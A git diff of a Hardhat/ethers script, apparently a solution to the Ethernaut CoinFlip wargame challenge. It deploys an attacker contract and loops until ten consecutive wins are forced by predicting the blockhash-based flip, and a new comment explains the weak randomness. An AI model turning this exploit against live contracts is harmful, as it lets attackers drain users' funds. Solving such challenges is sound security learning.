@@ -1,26 +1,29 @@
 import { BigNumber, Contract } from "ethers";
 import { ethers } from "hardhat";
 import { deployContract } from "../../utils/deployContract";
-import { abi } from "../../artifacts/contracts/CoinFlip/CoinFlip.sol/CoinFlip.json";
+import { abi } from "../../artifacts/contracts/3.CoinFlip/CoinFlip.sol/CoinFlip.json";
+import { displayResult } from "../../utils/displayResult";
+import logger from "node-color-log";
 
-function setTargetContract() {
-  const contractAddress = "0x865c9500404e1BBAa7ce5C51986c7ea39503301C";
-  return new Contract(contractAddress, abi);
-}
+const targetAddress = "0x2639dF2d1E0b0D60A78cEaE040f2381f6bBC0481";
 
 async function main() {
   const [attacker] = await ethers.getSigners();
-  const CoinFlipAttack = await deployContract("CoinFlipAttacker", attacker);
-  const CoinFlipTarget = setTargetContract();
+  const CoinFlipAttack = await deployContract("CoinFlipAttacker", attacker, [
+    targetAddress,
+  ]);
+  const CoinFlipTarget = new Contract(targetAddress, abi, attacker);
   let consecutiveWin = BigNumber.from(0);
-  console.log("Attack starts");
-  for (let i = 0; i < 11; i++) {
+  consecutiveWin = await CoinFlipTarget.consecutiveWins();
+
+  while (consecutiveWin.lt(10)) {
     const pendingTx = await CoinFlipAttack.attack();
-    await pendingTx.wait();
-    consecutiveWin = await CoinFlipTarget.connect(attacker).consecutiveWins();
-    console.log("Consecutive wins", consecutiveWin);
+    await pendingTx.wait().catch(() => {});
+
+    consecutiveWin = await CoinFlipTarget.consecutiveWins();
+    logger.info(`Consecutive win: ${consecutiveWin}`);
   }
-  console.log("Success: ", consecutiveWin.gte(10));
+  displayResult(consecutiveWin.gte(10));
 }
 
 main().catch((error) => {
@@ -28,10 +31,9 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 
-/* Explanation :
-In previous version of solidity, the constructor was named after the name of 
-the contract. Here Fal1out is mispelled, thus it is a regular public function,
-callable by anyone.
-Usefull link: 
-https://www.zupzup.org/smart-contract-interaction/
-*/
+//
+// To compute the "random" output of each flip the CoinFlip contract uses
+// uint256(blockhash(block.number - 1)). The result of this computation is deterministic
+// and can be predicted by the attacker. To make the attack easier,
+// we first compute the result of the flip inside a contract named CoinFlipAttacker
+// then call the flip function.
